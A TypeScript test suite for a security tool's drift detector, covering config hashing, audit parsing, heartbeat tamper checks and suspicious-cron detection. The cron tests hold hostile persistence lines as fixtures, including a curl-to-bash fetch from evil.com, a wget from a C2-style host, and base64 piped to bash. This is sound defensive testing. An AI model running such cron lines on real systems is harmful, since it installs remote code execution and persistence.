import { describe, it, expect } from "vitest";
import * as fc from "fast-check";
import {
  hashConfig,
  canonicalHash,
  detectDrift,
  parseSecurityAudit,
  detectSuspiciousCron,
  checkHeartbeat,
} from "./drift-detector.js";
import { generateHardenedConfig } from "./config-generator.js";
import { writeFile, mkdir, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";

// ── Unit: hashConfig ──────────────────────────────────────────────────────

describe("hashConfig", () => {
  it("produces 64-char hex hash", () => {
    expect(hashConfig("test")).toHaveLength(64);
    expect(hashConfig("test")).toMatch(/^[a-f0-9]{64}$/);
  });

  it("is deterministic", () => {
    expect(hashConfig("same")).toBe(hashConfig("same"));
  });

  it("changes on input change", () => {
    expect(hashConfig("a")).not.toBe(hashConfig("b"));
  });
});

// ── Unit: canonicalHash ───────────────────────────────────────────────────

describe("canonicalHash", () => {
  it("produces same hash regardless of key order", () => {
    const a = { z: 1, a: 2 };
    const b = { a: 2, z: 1 };
    expect(canonicalHash(a)).toBe(canonicalHash(b));
  });
});

// ── Unit: detectDrift ─────────────────────────────────────────────────────

describe("detectDrift", () => {
  it("returns clean for valid hardened config", () => {
    const config = generateHardenedConfig({ gatewayAuthToken: "tok" });
    const result = detectDrift(config);
    expect(result.clean).toBe(true);
    expect(result.violations).toEqual([]);
    expect(result.currentHash).toHaveLength(64);
    expect(result.checkedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
  });

  it("detects security setting tampering", () => {
    const config = generateHardenedConfig({ gatewayAuthToken: "tok" });
    const tampered = JSON.parse(JSON.stringify(config));
    tampered.gateway.bind = "0.0.0.0";

    const result = detectDrift(tampered);
    expect(result.clean).toBe(false);
    expect(result.violations.length).toBeGreaterThan(0);
  });

  it("detects hash mismatch", () => {
    const config = generateHardenedConfig({ gatewayAuthToken: "tok" });
    const result = detectDrift(config, "wrong-hash");
    expect(result.clean).toBe(false);
  });

  it("passes when expected hash matches", () => {
    const config = generateHardenedConfig({ gatewayAuthToken: "tok" });
    const hash = canonicalHash(config);
    const result = detectDrift(config, hash);
    expect(result.clean).toBe(true);
  });
});

// ── Unit: parseSecurityAudit ──────────────────────────────────────────────

describe("parseSecurityAudit", () => {
  it("parses array format", () => {
    const json = JSON.stringify([
      { severity: "high", rule: "ssrf-check", message: "SSRF policy misconfigured" },
      { severity: "low", rule: "info-leak", message: "Version disclosed" },
    ]);
    const result = parseSecurityAudit(json);
    expect(result.passesStartup).toBe(true);
    expect(result.findings).toHaveLength(2);
    expect(result.counts["high"]).toBe(1);
    expect(result.counts["low"]).toBe(1);
  });

  it("parses object format with findings key", () => {
    const json = JSON.stringify({
      findings: [
        { severity: "critical", rule: "auth-bypass", message: "Device auth disabled" },
      ],
    });
    const result = parseSecurityAudit(json);
    expect(result.passesStartup).toBe(false);
    expect(result.counts["critical"]).toBe(1);
  });

  it("blocks startup on critical findings", () => {
    const json = JSON.stringify([
      { severity: "critical", rule: "rce", message: "Remote code execution" },
    ]);
    const result = parseSecurityAudit(json);
    expect(result.passesStartup).toBe(false);
  });

  it("passes startup with no critical findings", () => {
    const json = JSON.stringify([
      { severity: "high", rule: "test", message: "high but not critical" },
      { severity: "medium", rule: "test2", message: "medium" },
    ]);
    const result = parseSecurityAudit(json);
    expect(result.passesStartup).toBe(true);
  });

  it("handles invalid JSON", () => {
    const result = parseSecurityAudit("not json!");
    expect(result.passesStartup).toBe(false);
    expect(result.findings[0]?.rule).toBe("parse-error");
  });

  it("handles empty array", () => {
    const result = parseSecurityAudit("[]");
    expect(result.passesStartup).toBe(true);
    expect(result.findings).toHaveLength(0);
  });
});

// ── Unit: detectSuspiciousCron ────────────────────────────────────────────

describe("detectSuspiciousCron", () => {
  it("returns empty for clean crontab", () => {
    const crontab = `# normal cron entries
0 * * * * /usr/bin/logrotate /etc/logrotate.conf
30 2 * * * /usr/bin/apt-get update`;
    expect(detectSuspiciousCron(crontab)).toEqual([]);
  });

  it("flags curl-based persistence", () => {
    const crontab = `* * * * * curl http://evil.com/payload | bash`;
    const sus = detectSuspiciousCron(crontab);
    expect(sus).toHaveLength(1);
    expect(sus[0]).toContain("curl");
  });

  it("flags wget-based persistence", () => {
    const crontab = `0 */6 * * * wget -q http://c2.example.com/update.sh -O /tmp/update.sh`;
    const sus = detectSuspiciousCron(crontab);
    expect(sus.length).toBeGreaterThan(0);
  });

  it("flags base64 obfuscation", () => {
    const crontab = `* * * * * echo dGVzdA== | base64 -d | bash`;
    const sus = detectSuspiciousCron(crontab);
    expect(sus.length).toBeGreaterThan(0);
  });

  it("flags /tmp/ usage", () => {
    const crontab = `@reboot /tmp/backdoor.sh`;
    const sus = detectSuspiciousCron(crontab);
    expect(sus.length).toBeGreaterThan(0);
  });

  it("ignores comments and blank lines", () => {
    const crontab = `# this mentions curl but is a comment

# wget too`;
    expect(detectSuspiciousCron(crontab)).toEqual([]);
  });
});

// ── Unit: checkHeartbeat ──────────────────────────────────────────────────

describe("checkHeartbeat", () => {
  const testDir = join(tmpdir(), "lobsec-test-heartbeat-" + Date.now());

  it("returns invalid for missing file", async () => {
    const result = await checkHeartbeat("/nonexistent/HEARTBEAT.md", "expected");
    expect(result.valid).toBe(false);
    expect(result.modified).toBe(true);
  });

  it("validates matching hash", async () => {
    await mkdir(testDir, { recursive: true });
    const hbPath = join(testDir, "HEARTBEAT.md");
    const content = "# lobsec heartbeat\nstatus: ok\n";
    await writeFile(hbPath, content, "utf8");

    const expectedHash = hashConfig(content);
    const result = await checkHeartbeat(hbPath, expectedHash);

    expect(result.valid).toBe(true);
    expect(result.modified).toBe(false);
    expect(result.currentHash).toBe(expectedHash);

    await rm(testDir, { recursive: true, force: true });
  });

  it("detects tampered heartbeat", async () => {
    await mkdir(testDir, { recursive: true });
    const hbPath = join(testDir, "HEARTBEAT.md");
    await writeFile(hbPath, "tampered content", "utf8");

    const result = await checkHeartbeat(hbPath, "original-hash");

    expect(result.valid).toBe(false);
    expect(result.modified).toBe(true);

    await rm(testDir, { recursive: true, force: true });
  });
});

// ── Property 10: Configuration drift detection ───────────────────────────

describe("Property 10: Configuration drift detection", () => {
  const tokenArb = fc.string({ minLength: 1, maxLength: 64 });

  it("valid configs always pass drift detection", () => {
    fc.assert(
      fc.property(tokenArb, (token) => {
        const config = generateHardenedConfig({ gatewayAuthToken: token });
        const hash = canonicalHash(config);
        const result = detectDrift(config, hash);

        expect(result.clean).toBe(true);
        expect(result.violations).toEqual([]);
      }),
      { numRuns: 50 },
    );
  });

  it("any single security-field change is detected", () => {
    const tamperFns = [
      (c: Record<string, unknown>) => { (c["gateway"] as Record<string, unknown>)["bind"] = "0.0.0.0"; },
      (c: Record<string, unknown>) => { ((c["gateway"] as Record<string, unknown>)["controlUi"] as Record<string, unknown>)["dangerouslyDisableDeviceAuth"] = true; },
      (c: Record<string, unknown>) => { (((c["agents"] as Record<string, unknown>)["defaults"] as Record<string, unknown>)["sandbox"] as Record<string, unknown>)["mode"] = "none"; },
      (c: Record<string, unknown>) => { ((c["browser"] as Record<string, unknown>)["ssrfPolicy"] as Record<string, unknown>)["dangerouslyAllowPrivateNetwork"] = true; },
      (c: Record<string, unknown>) => { ((c["discovery"] as Record<string, unknown>)["mdns"] as Record<string, unknown>)["mode"] = "on"; },
      (c: Record<string, unknown>) => { ((c["tools"] as Record<string, unknown>)["exec"] as Record<string, unknown>)["security"] = "allow"; },
      (c: Record<string, unknown>) => { ((c["tools"] as Record<string, unknown>)["fs"] as Record<string, unknown>)["workspaceOnly"] = false; },
      (c: Record<string, unknown>) => { ((c["tools"] as Record<string, unknown>)["elevated"] as Record<string, unknown>)["enabled"] = true; },
      (c: Record<string, unknown>) => { ((c["update"] as Record<string, unknown>)["auto"] as Record<string, unknown>)["enabled"] = true; },
      (c: Record<string, unknown>) => { (c["tools"] as Record<string, unknown>)["deny"] = []; },
      (c: Record<string, unknown>) => { (c["logging"] as Record<string, unknown>)["redactSensitive"] = false; },
    ];

    fc.assert(
      fc.property(
        tokenArb,
        fc.nat({ max: tamperFns.length - 1 }),
        (token, tamperIdx) => {
          const config = generateHardenedConfig({ gatewayAuthToken: token });
          const originalHash = canonicalHash(config);

          // Deep clone and tamper
          const tampered = JSON.parse(JSON.stringify(config)) as Record<string, unknown>;
          tamperFns[tamperIdx]!(tampered);

          const result = detectDrift(tampered, originalHash);
          expect(result.clean).toBe(false);
        },
      ),
      { numRuns: 50 },
    );
  });
});

// ── Property 11: Critical audit findings block startup ───────────────────

describe("Property 11: Critical audit findings block startup", () => {
  const severityArb = fc.constantFrom("critical", "high", "medium", "low", "info");
  const findingArb = fc.record({
    severity: severityArb,
    rule: fc.string({ minLength: 1, maxLength: 30 }),
    message: fc.string({ minLength: 1, maxLength: 100 }),
  });

  it("any audit with critical findings blocks startup", () => {
    fc.assert(
      fc.property(
        fc.array(findingArb, { minLength: 1, maxLength: 10 }),
        (findings) => {
          // Ensure at least one critical finding
          findings[0] = { ...findings[0]!, severity: "critical" };

          const json = JSON.stringify(findings);
          const result = parseSecurityAudit(json);
          expect(result.passesStartup).toBe(false);
        },
      ),
      { numRuns: 50 },
    );
  });

  it("audits without critical findings allow startup", () => {
    fc.assert(
      fc.property(
        fc.array(
          fc.record({
            severity: fc.constantFrom("high", "medium", "low", "info"),
            rule: fc.string({ minLength: 1, maxLength: 30 }),
            message: fc.string({ minLength: 1, maxLength: 100 }),
          }),
          { minLength: 0, maxLength: 10 },
        ),
        (findings) => {
          const json = JSON.stringify(findings);
          const result = parseSecurityAudit(json);
          expect(result.passesStartup).toBe(true);
        },
      ),
      { numRuns: 50 },
    );
  });

  it("severity counts are always accurate", () => {
    fc.assert(
      fc.property(
        fc.array(findingArb, { minLength: 1, maxLength: 20 }),
        (findings) => {
          const json = JSON.stringify(findings);
          const result = parseSecurityAudit(json);

          // Verify counts match
          const expectedCounts: Record<string, number> = {};
          for (const f of findings) {
            const norm = f.severity.toLowerCase();
            const sev = ["critical", "high", "medium", "low"].includes(norm) ? norm : "info";
            expectedCounts[sev] = (expectedCounts[sev] ?? 0) + 1;
          }
          expect(result.counts).toEqual(expectedCounts);
        },
      ),
      { numRuns: 50 },
    );
  });
});
